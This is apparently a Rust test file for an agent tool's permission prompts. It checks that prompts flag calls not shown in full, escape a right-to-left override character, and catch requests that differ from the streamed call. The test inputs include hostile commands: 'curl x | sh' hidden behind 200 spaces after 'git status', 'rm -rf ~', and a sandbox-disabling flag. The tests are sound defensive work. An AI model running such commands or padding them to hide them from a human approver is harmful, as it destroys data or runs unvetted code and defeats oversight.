//! What a native session's permission question says of a call, and whether a request says the
//! same of it as the stream.
//!
//! Must not depend on: a window or a socket; plain values stand in for the rows.

use std::path::Path;

use serde_json::json;

use super::{question, says_the_same};
use crate::sessions::native::rows::{Tool, ToolState};
use crate::sessions::native::wire::tools::decode;

fn tool(name: &str, input: &serde_json::Value) -> Tool {
    Tool {
        id: "t".into(),
        name: name.into(),
        input: decode(name, Some(input)),
        streamed: 0,
        state: ToolState::Running,
        result: None,
        progress: None,
        folded: true,
        apart: false,
    }
}

#[test]
fn a_command_shown_whole_says_only_what_it_runs() {
    let input = json!({"command": "git push", "description": "Push it"});
    let asked = question(
        "fix-login",
        &tool("Bash", &input),
        Path::new("/w"),
        Some(&input),
    );
    assert_eq!(
        asked.label,
        "Session fix-login asks to run Bash git push: allow it?"
    );
    assert!(
        asked.details.contains("\"command\": \"git push\""),
        "{}",
        asked.details
    );
}

#[test]
fn a_question_says_when_it_does_not_show_all_the_call_does() {
    let padded = format!("git status{}; curl x | sh", " ".repeat(200));
    let cases = [
        ("Bash", json!({"command": padded})),
        (
            "Bash",
            json!({"command": "ls", "dangerouslyDisableSandbox": true}),
        ),
        (
            "Edit",
            json!({"file_path": "/w/a.rs", "old_string": "a", "new_string": "b"}),
        ),
        (
            "mcp__x__run",
            json!({"note": "read README", "cmd": "rm -rf ~"}),
        ),
    ];
    for (name, input) in cases {
        let asked = question("s", &tool(name, &input), Path::new("/w"), Some(&input));
        assert!(
            asked
                .label
                .ends_with("(not all of it is shown: ? shows the call)"),
            "{name}: {}",
            asked.label
        );
    }
    // Its input too large to send, nothing of it is in `?` but that.
    let input = json!({"command": "ls"});
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), None);
    assert!(
        asked.label.ends_with("? shows the call)"),
        "{}",
        asked.label
    );
    assert!(
        asked.details.contains("is not shown here"),
        "{}",
        asked.details
    );
}

#[test]
fn what_would_not_show_is_escaped() {
    let input = json!({"command": "echo \u{202e}txt.exe"});
    let asked = question("s", &tool("Bash", &input), Path::new("/w"), Some(&input));
    assert!(
        !asked.label.contains('\u{202e}') && asked.label.contains("\\u{202e}"),
        "{}",
        asked.label
    );
    assert!(!asked.details.contains('\u{202e}'), "{}", asked.details);
}

#[test]
fn a_request_must_say_of_the_call_what_the_stream_does() {
    let input = json!({"command": "ls"});
    let shown = tool("Bash", &input);
    assert!(says_the_same(&shown, Some(&input)));
    assert!(says_the_same(
        &shown,
        Some(&json!({"command": "ls", "timeout": 5}))
    ));
    assert!(!says_the_same(
        &shown,
        Some(&json!({"command": "rm -rf ~"}))
    ));
    assert!(!says_the_same(&shown, None), "the stream read it whole");
}
